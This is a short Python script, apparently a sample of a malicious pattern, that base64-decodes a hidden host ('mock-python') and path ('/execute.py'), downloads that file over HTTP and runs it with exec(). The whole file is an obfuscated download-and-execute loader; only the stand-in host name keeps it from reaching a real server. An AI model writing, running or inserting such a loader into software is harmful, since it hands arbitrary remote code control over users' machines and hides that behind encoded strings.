import http.client
import importlib
import base64

def get_encoded_host_and_path():
    return "bW9jay1weXRob24=", "L2V4ZWN1dGUucHk="

def get_decoded_host_and_path(encoded_host, encoded_path):
    host = base64.b64decode(encoded_host).decode('utf-8')
    path = base64.b64decode(encoded_path).decode('utf-8')
    return host, path

def fetch_response(host, path):
    connection = http.client.HTTPConnection(host)
    connection.request("GET", path)
    response = connection.getresponse()
    source = response.read().decode('utf-8')
    connection.close()
    return source

def exec_code(src):
    exec(src)

def main():
    encoded_host, encoded_path = get_encoded_host_and_path()
    host, path = get_decoded_host_and_path(encoded_host, encoded_path)
    source = fetch_response(host, path)
    exec_code(source)

main()
